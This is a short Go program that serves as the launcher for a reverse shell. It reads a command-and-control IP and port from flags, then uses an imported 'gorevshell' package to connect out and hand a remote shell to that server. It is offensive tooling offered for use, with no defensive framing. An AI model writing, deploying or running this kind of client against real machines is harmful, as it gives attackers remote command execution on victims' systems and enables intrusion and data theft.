package main

import (
	"flag"

	"github.com/cyberkhalid/gosec/gorevshell/gorevshell"
)

func main() {
	ip := flag.String("ip", "", "Ip address of the reverse shell server/ c2")
	port := flag.String("p", "", "Port onwhich server/c2 listening")
	flag.Parse()

	var goRevShell gorevshell.GoRevShell

	goRevShell.Init(*ip, *port)
	goRevShell.Connect()
	goRevShell.Rshell()
}
